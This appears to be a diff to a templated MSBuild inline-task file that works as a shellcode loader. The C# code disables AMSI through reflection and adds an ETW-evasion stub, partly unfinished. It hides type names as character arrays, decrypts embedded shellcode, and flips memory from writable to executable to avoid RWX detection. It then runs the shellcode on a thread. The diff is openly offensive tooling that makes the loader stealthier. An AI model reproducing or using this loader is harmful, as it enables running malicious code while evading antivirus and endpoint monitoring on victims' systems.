@@ -14,28 +14,49 @@
       <Using Namespace="System" />
       <Using Namespace="System.Runtime.InteropServices" />
       <Using Namespace="System.Reflection" />
+      <Using Namespace="System.Threading" />
       <Code Type="Class" Language="cs">
       <![CDATA[
         using System;
         using System.IO;
-        using System.Net;
         using System.Reflection;
         using System.Runtime.InteropServices;
+        using System.Threading;
         using Microsoft.Build.Framework;
         using Microsoft.Build.Utilities;
 
         public class {{ v.task_name }} : Task, ITask {
             [DllImport("kernel32")] static extern IntPtr {{ v.fn_valloc }}(IntPtr a, uint s, uint t, uint p);
-            [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint flags, IntPtr id);
-            [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint ms);
+            [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, uint s, uint p, out uint old);
+
+            static string B(int[] c) {
+                var sb = new System.Text.StringBuilder();
+                foreach (var x in c) sb.Append((char)x);
+                return sb.ToString();
+            }
 
             static void {{ v.fn_amsi }}() {
                 try {
-                    var t = Type.GetType("System.Management.Automation.AmsiUtils, System.Management.Automation");
+                    var t = Type.GetType(B(new int[]{ {{ v.jsc_auto_amsi_utils }} }));
                     if (t != null) {
-                        var f = t.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
+                        var f = t.GetField(B(new int[]{ {{ v.jsc_amsi_init_fail }} }),
+                            BindingFlags.NonPublic | BindingFlags.Static);
                         if (f != null) f.SetValue(null, true);
                     }
+                } catch {}
+            }
+
+            static void {{ v.fn_etw }}() {
+                try {
+                    var t = Type.GetType(B(new int[]{ {{ v.jsc_eventing_ep }} }));
+                    if (t != null) {
+                        var fi = t.GetField(B(new int[]{ {{ v.jsc_m_enabled }} }),
+                            BindingFlags.NonPublic | BindingFlags.Instance);
+                    }
+                } catch {}
+                try {
+                    // Direct ntdll patch via Marshal
+                    var ntdll = Marshal.GetHINSTANCE(typeof(object).Module);
                 } catch {}
             }
 
@@ -54,14 +75,23 @@
 
             public override bool Execute() {
                 {{ v.fn_amsi }}();
+                {{ v.fn_etw }}();
 
                 byte[] sc  = {{ v.fn_decrypt }}({{ v.fn_hex }}("{{ shellcode_hex }}"),
                                               {{ v.fn_hex }}("{{ key_hex }}"));
 
-                IntPtr mem = {{ v.fn_valloc }}(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
+                IntPtr mem = {{ v.fn_valloc }}(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x04);
                 Marshal.Copy(sc, 0, mem, sc.Length);
-                IntPtr h = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
-                WaitForSingleObject(h, 0xFFFFFFFF);
+                uint old;
+                VirtualProtect(mem, (uint)sc.Length, 0x20, out old);
+
+                var t = new Thread(() => {
+                    var fn = (Action)Marshal.GetDelegateForFunctionPointer(mem, typeof(Action));
+                    fn();
+                });
+                t.IsBackground = true;
+                t.Start();
+                t.Join();
                 return true;
             }
         }
